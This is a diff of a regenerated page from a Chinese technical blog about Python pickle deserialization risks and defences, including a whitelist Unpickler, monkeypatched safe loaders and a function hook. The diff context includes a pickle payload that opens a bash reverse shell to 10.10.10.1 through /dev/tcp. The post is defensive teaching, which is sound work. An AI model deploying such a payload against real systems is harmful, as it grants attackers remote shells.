@@ -154,7 +154,7 @@
 </blockquote>
 <h1 id="案例">案例</h1>
 <p>有次同事找我看个Python的安全问题。测试代码是这样的：</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
 <span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
 
 <span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Test</span>(<span style="color:#658b00">object</span>):
@@ -177,7 +177,7 @@
 </blockquote>
 <p>简单翻译一下：只对你信任数据进行unpickle，因为可以构建恶意的pickle数据，在unpickle时会执行任何代码，要么考虑采用hmac对数据签名检查。</p>
 <p>pickle是一种基于栈的编程语言，目前发展到python3.8已有5个协议版本。我们先使用python2来看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cposix
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cposix
 system
 p0
 (S<span style="color:#cd5555">&#39;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#39;</span>
@@ -215,7 +215,7 @@ Rp3
 <p>就是由于个这个元组，跟pickle中的指令<code>R</code>可被利用之机：&ldquo;该元组作为可调用参数的对象并执行该对象&rdquo;，如果这个元组有恶意代码，则可以调用而产生风险。虽然<code>__reduce__</code>返回只能是一个可调用对象，但可以结合os.system，subprocess.run，exec来执行任一命令或代码，几乎能做任何事了。</p>
 <h1 id="解决办法">解决办法</h1>
 <p>正如python官方对pickle的介绍说明，只对信任的数据unpickle，对数据数字签名检查。但通常数字签名只限于自产自销的场景。打开pickle的源码来看，事实上还有另一个方法。python定义了Unpickler的接口，关键在于可以覆写find_class，下面是标准库的默认实现：</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
     <span style="color:#228b22"># Subclasses may override this.</span>
     sys.audit(<span style="color:#cd5555">&#39;pickle.find_class&#39;</span>, module, name)
     <span style="color:#8b008b;font-weight:bold">if</span> self.proto &lt; <span style="color:#b452cd">3</span> <span style="color:#8b008b">and</span> self.fix_imports:
@@ -229,7 +229,7 @@ Rp3
     <span style="color:#8b008b;font-weight:bold">else</span>:
         <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">getattr</span>(sys.modules[module], name)
 </code></pre></div><p>默认实现的find_class函数会自动导入模块，并且还兼容python2时fix_imports。若覆写，采用对导入模块做白名单检查控制，不允许导入像os.system等可以执行命令或代码能力，则问题已基本可以解决。那这个函数什么时机被调用呢？从代码搜索来看有4处调用此函数，他们是在解释指令的地方。如案例中的<code>c</code>指令导入模块时，就会调用它。</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
 
 <span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">WhiteListUnpickler</span>(pickle.Unpickler):
     <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
@@ -242,20 +242,20 @@ Rp3
             <span style="color:#8b008b;font-weight:bold">raise</span> pickle.UnpicklingError(<span style="color:#cd5555">&#34;&#39;</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">.</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">&#39; is forbidden&#34;</span> % (module, name))
 
 bs = <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;....&#39;</span> <span style="color:#228b22"># 需要unpickler的内容</span>
-<span style="color:#658b00">file</span> = io.BytesIO(bs)
-WhiteListUnpickler(<span style="color:#658b00">file</span>).load()
+file = io.BytesIO(bs)
+WhiteListUnpickler(file).load()
 </code></pre></div><p>上面的代码示例只允许<code>__main__</code>模块调用，采用白名单谨慎列出安全的模块则可以规避安全问题。但这需要调用者生成WhiteListUnpickler类，对业务代码有侵入性。那有没有一种对上层调用不感知的修改？有:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
 
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_load</span>(<span style="color:#658b00">file</span>, *, fix_imports=True, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
-          buffers=None):
-    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(<span style="color:#658b00">file</span>, fix_imports=fix_imports, buffers=buffers,
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_load</span>(file, *, fix_imports=<span style="color:#8b008b;font-weight:bold">True</span>, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
+          buffers=<span style="color:#8b008b;font-weight:bold">None</span>):
+    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
                      encoding=encoding, errors=errors).load()
 
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_loads</span>(s, *, fix_imports=True, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
-           buffers=None):
-    <span style="color:#658b00">file</span> = io.BytesIO(s)
-    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(<span style="color:#658b00">file</span>, fix_imports=fix_imports, buffers=buffers,
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_loads</span>(s, *, fix_imports=<span style="color:#8b008b;font-weight:bold">True</span>, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
+           buffers=<span style="color:#8b008b;font-weight:bold">None</span>):
+    file = io.BytesIO(s)
+    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
                       encoding=encoding, errors=errors).load()
 
 pickle.load = safe_load
@@ -273,7 +273,7 @@ pickle.loads = safe_loads
 </ul>
 <p>这就相当留下一个钩子，可以完成第三方模块导入时的初始化。利用这个机制，同样可以完成需要替换的函数先于业务代码自动加载。site机制如此的强大，其实也是一个非常大的安全隐患。因为我们通过pip install来安装第三方库，也可能写入pth文件，若它是一个恶意库或被篡改了，鬼知道它会做什么呢。前一段时间刷新闻看到pypi仓库清理了5000多个有问题的库。</p>
 <p>假定我们需要替换多个标准库的函数实现，若一个个通过<code>pickle.loads = safe_loads</code>这类方式来替换看起来有点比较丑陋，有没有一种可以比较好玩的方法？有：</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Hook</span>:
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Hook</span>:
     <span style="color:#8b008b;font-weight:bold">def</span> __init__(self):
         self._hook_to_orig = <span style="color:#658b00">dict</span>()
         self._orig_to_hook = <span style="color:#658b00">dict</span>()
@@ -300,12 +300,12 @@ pickle.loads = safe_loads
 hook = Hook()
 
 <span style="color:#228b22"># 示例，对os.system进行hook</span>
-<span style="color:#707a7c">@hook.register</span>(os, <span style="color:#cd5555">&#39;system&#39;</span>)
+<span style="color:#707a7c">@hook</span>.register(os, <span style="color:#cd5555">&#39;system&#39;</span>)
 <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_system</span>(cmd):
     <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;forbid execute the function&#34;</span>)
 
 <span style="color:#228b22"># 示例，对open进行hook</span>
-<span style="color:#707a7c">@hook.register</span>(buildins, <span style="color:#cd5555">&#39;open&#39;</span>)
+<span style="color:#707a7c">@hook</span>.register(buildins, <span style="color:#cd5555">&#39;open&#39;</span>)
 <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_open</span>(*arg, **argv):
     orig = get_orig_func()
     <span style="color:#228b22"># 对参数检查，如检查文件路径是否合法 </span>
@@ -413,7 +413,7 @@ hook = Hook()
       <nav class="site-state motion-element">
     <div class="site-state-item site-state-posts">
       <a href="http://lanlingzi.cn/post/">
-        <span class="site-state-item-count">154</span>
+        <span class="site-state-item-count">155</span>
         <span class="site-state-item-name">日志</span>
       </a>
     </div>
@@ -494,7 +494,7 @@ hook = Hook()
   <span class="author" itemprop="copyrightHolder">蘭陵N梓記</span>
 </div>
 <div class="powered-by">
-  Powered by - <a class="theme-link" href="http://gohugo.io" target="_blank" title="hugo" >Hugo v0.81.0</a>
+  Powered by - <a class="theme-link" href="http://gohugo.io" target="_blank" title="hugo" >Hugo v0.88.1</a>
 </div>
 <div class="theme-info">
   Theme by - <a class="theme-link" href="https://github.com/xtfly/hugo-theme-next" target="_blank"> NexT
